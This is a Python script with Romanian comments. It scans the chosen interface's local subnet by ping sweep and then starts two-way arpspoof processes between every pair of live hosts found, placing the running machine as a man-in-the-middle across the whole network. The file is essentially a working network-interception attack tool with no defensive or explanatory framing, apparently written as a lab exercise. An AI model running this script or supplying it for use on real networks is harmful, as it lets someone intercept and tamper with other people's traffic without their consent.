from tabnanny import check
from unittest import result
import netifaces
import json
import ipaddress
import concurrent.futures

def get_interfaces_status():
    interfaces = netifaces.interfaces()
    status = {}

    for interface in interfaces:
        addrs = netifaces.ifaddresses(interface)
        # Check if the AF_INET key (IPv4 address) exists
        if netifaces.AF_INET in addrs:
            status[interface] = 'up'
        else:
            status[interface] = 'down'

    return status

def get_network_info():
    network_info = {}
    interfaces = netifaces.interfaces()

    for interface in interfaces:
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            # For each interface with an IPv4 address, get the address and netmask
            ipv4_info = addrs[netifaces.AF_INET][0]
            address = ipv4_info.get('addr')
            netmask = ipv4_info.get('netmask')

            # Calculate network address (using bitwise AND between IP and netmask)
            network_address = '.'.join(str(int(a) & int(b)) for a, b in zip(address.split('.'), netmask.split('.')))

            network_info[interface] = {
                'IP Address': address,
                'Netmask': netmask,
                'Network Address': network_address
            }

    return network_info

def generate_ips(network_address, netmask):
    # Creează un obiect de rețea folosind adresa de rețea și masca de subrețea
    network = ipaddress.ip_network(f"{network_address}/{netmask}", strict=False)
    
    # Generează și returnează toate adresele IP din rețea, excluzând adresa de rețea și broadcast
    return [str(ip) for ip in network.hosts()]


import subprocess
import platform

def ping_address(ip_address, timeout=1000):
    # Determinați parametrii în funcție de sistemul de operare
    param = '-n' if platform.system().lower()=='windows' else '-c'
    timeout_param = '-w' if platform.system().lower()=='windows' else '-W'

    # Setează timeout-ul. Pe Windows este în milisecunde, pe Linux/Unix este în secunde
    if platform.system().lower() == 'windows':
        timeout_value = str(timeout)
    else:
        # Converteste milisecunde in secunde pentru Linux/Unix
        timeout_value = str(int(timeout / 1000))

    # Construiți și executați comanda
    command = ['ping', param, '1', timeout_param, timeout_value, ip_address]
    response = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)



    # Verificați codul de ieșire al comenzii
    if response.returncode == 0:
        return 0  #succes
    else:
        return 1  


def run_arpspoof(interface, ip1, ip2):
    try:
        # Construiește și execută comanda pentru primul target
        command1 = ['arpspoof', '-i', interface, '-t', ip1, ip2]
        pid = subprocess.Popen(command1)
        # Construiește și execută comanda pentru al doilea target (opțional)
        command2 = ['arpspoof', '-i', interface, '-t', ip2, ip1]
        pid = subprocess.Popen(command2)

        print(f"ARP Spoofing between {ip1} and {ip2} on {interface}")
    except subprocess.CalledProcessError as e:
        print(f"Eroare {e}")
    except Exception as e:
        print(f"Eroare {e}")


def prepare_arpspoofing(interface, ips):
    ip_pairs = []
    for i in range(0, len(ips)-1):
        for j in range(i+1, len(ips)):
            ip_pairs += [ips[i], ips[j]]
            run_arpspoof(interface, ips[i], ips[j])
    
        

def check_ip(ip):
    print(f"Checking connectivity with {ip}", end=" ")
    ret = ping_address(ip)
    if ret == 0:
        print("Online")
        return 0
    else:
        print("Offline")
    return 1

def check_ips(ip_list):
    result = []
    with concurrent.futures.ProcessPoolExecutor() as executor:
        res = list(executor.map(check_ip, ip_list))

    for index, ip in enumerate(ip_list):
        if res[index] == 0:
            result += [ip]

    return result

if __name__ == "__main__":

    intf = netifaces.interfaces()

    network_info = get_network_info()
    for interface, status in network_info.items():
        print(f"Interface {interface} Status: {status}")

    interface_status = get_interfaces_status()
    interfaces_status = get_interfaces_status()
    for interface, state in interfaces_status.items():
        print(f"Interface: {interface}, Status: {state}")
    
    print()
    
    s=''
    for index, interface in enumerate(intf):
        s += f'[{index}] {interface} '
    print(s)
    print("Enter the desired interface: ", end="")
    index = int(input())
    interface = intf[index]
    print(f"Selected interface is : {interface}.")
    
    all_network_ips = generate_ips(network_info[interface]['Network Address'], network_info[interface]["Netmask"])
    valid_targets = [ip for ip in check_ips(all_network_ips)[1:] if ip != network_info[interface]['IP Address']]  
    print(valid_targets)
    prepare_arpspoofing(interface, valid_targets)

    

    print("Waiting for any signal to stop")




